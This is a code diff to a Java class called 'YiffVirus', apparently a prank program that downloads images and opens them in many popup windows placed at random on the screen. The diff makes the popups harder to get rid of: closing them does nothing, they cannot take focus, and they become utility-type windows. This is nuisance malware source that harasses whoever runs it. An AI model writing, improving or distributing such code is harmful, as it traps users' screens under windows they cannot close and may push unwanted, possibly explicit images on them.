@@ -141,6 +141,9 @@ public class YiffVirus extends JFrame implements Runnable {
         // Takes images from the provider and opens them in many window popups
         if (config.shouldPopupImages()){
             List<String> images = getImageProviderService().fetchImages(25);
+            // Gets the size of the screen
+            int screenWidth = (int) java.awt.Toolkit.getDefaultToolkit().getScreenSize().getWidth();
+            // Create new popups
             new Thread(() -> {
                 for (String url : images){
 
@@ -158,11 +161,12 @@ public class YiffVirus extends JFrame implements Runnable {
                         JLabel imageLabel = new JLabel();
                         imageLabel.setIcon(new ImageIcon(image));
                         popup.setContentPane(imageLabel);
-                        popup.setDefaultCloseOperation(DISPOSE_ON_CLOSE);
+                        popup.setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
                         popup.setTitle(Long.toString(System.nanoTime(), Character.MAX_RADIX));
+                        popup.setFocusable(false);
+                        popup.setFocusableWindowState(false);
+                        popup.setType(Type.UTILITY);
 
-                        // Gets the size of the screen
-                        int screenWidth = (int) java.awt.Toolkit.getDefaultToolkit().getScreenSize().getWidth();
                         // Set the position of the window to a random point on screen, handles window size to not go off screen
                         popup.setLocation((int) (Math.random() * (screenWidth - popup.getWidth())),
                                 (int) (Math.random() * (java.awt.Toolkit.getDefaultToolkit().getScreenSize().getHeight()
